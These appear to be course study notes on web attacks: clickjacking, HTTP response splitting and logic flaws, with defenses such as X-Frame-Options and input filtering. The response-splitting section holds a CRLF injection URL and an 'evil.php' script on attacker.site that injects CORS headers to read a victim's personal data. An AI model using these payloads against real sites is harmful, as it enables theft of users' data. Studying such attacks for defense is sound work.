# ClickJacking
- Clickjacking is a technique, also known as User Interface (UI) redressing
- Technically, an attacker that wants to perform this attack crafts a malicious HTML page. This page can contain two overlapping layers, one malicious and the other the actual target of the click.
- malicous layer is what is visible to the user and contain innocuous(غير موذية) resource that the vivtim should feel secure clicking it
- the target layes is included via iframe is invisible to the victim and contain resource that will actuelly be clicked
   - this layer usually contain a button that will perform and operation that the victim would be unwilling to perform under normal circumstances
- That attack comprimises Four Steps
  - Feasability Study
  - Building Of a malicous web page
  - spreading the malicous page link
  - waiting for victim to click
- Clickjacking can be leveraged to perform a wide number of attacks such as:
	- forcing users to click on ads
	- performing any action that only requires clicking on a website
- clickjacking defenses
	- The Old School : Tries to avoid clickjacking by using JavaScript code
	- The Current School : HTTP response headers, Content Security Policy, Browser Frame-Breaker
		- It can have two different values: 
			- SAME ORIGIN : The document may be shown inside an iframe only if the container page (under the control of the attacker) and the contained document share the same origin.
			- DENY : The document may not be shown inside an iframe, regardless of the container’s origin.
			- X-Frame-Options

# HTTP Response Splitting
- This type of Header Injection attack occurs when an attacker `sends` arbitrary data to the server and this data is `returned` as part of the HTTP response.
- Goal : Split the Response into two parts by means of special characters CRLF:
	-  CR (Carriage Return) – `[ \r ]`
	-  LF (Line Feed) – `[ \n ]`
- the use of these charachters is related to how the http protoclo determines the begining of the http response header ( affects all browsers )
- goal of the attacker is to craft http response by sending malicious input including the crafted headers and the special charachters
- A `Header injection` attack would add new Headers to the current HTTP Response block.
- but this attack not only injecting data into headers but alos creating a new http response block with new headers
- Example :
	- A web application puts User Input into one of the Response Headers. This header is Set-Cookie.
	- xss
	- `GET http://target.site/trackUrl.php?url=http://elsfoo.com%0d%0aHTTP/1. 1%20200%20OK%0d%0aContent%2dType:%20text/html%0d%0aContent%2dLengt h:%2039%0d%0a%0d%0a`	
- Bypass Same Origin Policy
- Example
	- Suppose a webpage named getPersonalData.php returns the personal data of the currently logged-in user and that the page is vulnerable to HTTP response splitting (in the trackingUrl parameter).
	- Attacker build a malicious page with this URL http://attacker.site/evil.php.
	- The following is the code of evil.php:
```
	<script>
function loadXMLDoc()
 {
 var xmlhttp;
 xmlhttp=new XMLHttpRequest();
 xmlhttp.withCredentials = true;
 xmlhttp.onreadystatechange=function()
 {
 if (xmlhttp.readyState==4 && xmlhttp.status==200)
 {
 document.getElementById("responseDiv").innerHTML=xmlhttp.responseText;
 }
 }
 
xmlhttp.open("GET","http://target.site/getPersonalData.php?trackingUrl=test%0d%0aAcces
s-Control-Allow-Origin:%20http://attacker.site%0d%0aAccess-Control-AllowCredentials:%20true",true);
 xmlhttp.send();
 }</script>
```

- Best Defensive
	- Filter the input data
	- PHP
	- `header(“Location: elsfoo.com”);`
	- PHP v5.1.4 both critical characters CR and LF have been denied within the function header

# Logic Flow
- The best way to detect them is by analyzing the transaction chart of all the processes that the web application provides.
